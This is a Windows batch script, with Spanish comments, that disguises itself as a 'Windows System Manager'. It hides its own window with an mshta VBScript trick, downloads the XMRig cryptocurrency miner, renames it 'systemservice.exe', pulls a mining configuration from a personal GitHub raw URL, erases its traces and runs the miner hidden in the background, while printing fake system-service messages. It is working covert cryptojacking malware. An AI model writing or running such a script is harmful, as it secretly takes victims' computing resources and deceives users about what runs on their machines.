@echo off
chcp 65001 > nul
title Windows System Manager
echo Iniciando servicios de sistema...

:: Ocultar ventana
if "%1" == "h" goto start_process
mshta vbscript:createobject("wscript.shell").run("""%~f0"" h",0)(window.close)&&exit

:start_process
echo Descargando componentes del sistema...

:: Crear directorio de trabajo
set WORKDIR=%temp%\WindowsModules
if not exist "%WORKDIR%" mkdir "%WORKDIR%"
cd /d "%WORKDIR%"

:: Descargar XMRig desde GitHub oficial
echo [1/3] Descargando componentes...
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-msvc-win64.zip' -OutFile 'xmrig.zip'"

:: Extraer XMRig
echo [2/3] Extrayendo archivos...
powershell -Command "Expand-Archive -Path 'xmrig.zip' -DestinationPath '.' -Force"
move "xmrig-6.20.0-msvc-win64\xmrig.exe" "systemservice.exe"

:: Descargar config.json desde TU repositorio RAW
echo [3/3] Configurando servicios...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/DECODERkING/code/main/config.json' -OutFile 'config.json'"

:: Limpiar y ejecutar
del "xmrig.zip"
rmdir "xmrig-6.20.0-msvc-win64" /s /q

:: Ejecutar XMRig completamente oculto
echo Iniciando procesos en segundo plano...
start /B systemservice.exe --config=config.json

echo Procesos del sistema iniciados correctamente
timeout /t 3 > nul
exit
